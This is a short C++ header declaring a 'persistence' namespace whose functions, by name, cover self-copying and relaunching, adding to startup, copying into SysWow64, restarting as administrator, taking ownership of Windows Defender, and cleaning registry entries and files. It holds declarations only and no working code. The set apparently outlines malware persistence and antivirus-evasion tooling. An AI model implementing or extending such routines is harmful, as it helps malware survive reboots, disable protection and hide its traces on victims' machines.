#include "include.h"

namespace persistence {

bool isUserAdmin();
void DefenderOwner();
bool checkAndCreateFile(const std::string& filename);
void addToStartup();
void reset();
void restartSystem();
void restartAsAdmin();
bool copyAndRunSelf();
void cleanreg();
void cleanfile();
std::string getDiskSerial();
void CopyFileToSysWow64(std::string destPath, std::string filename);
void StopExe();

} // namespace persistence

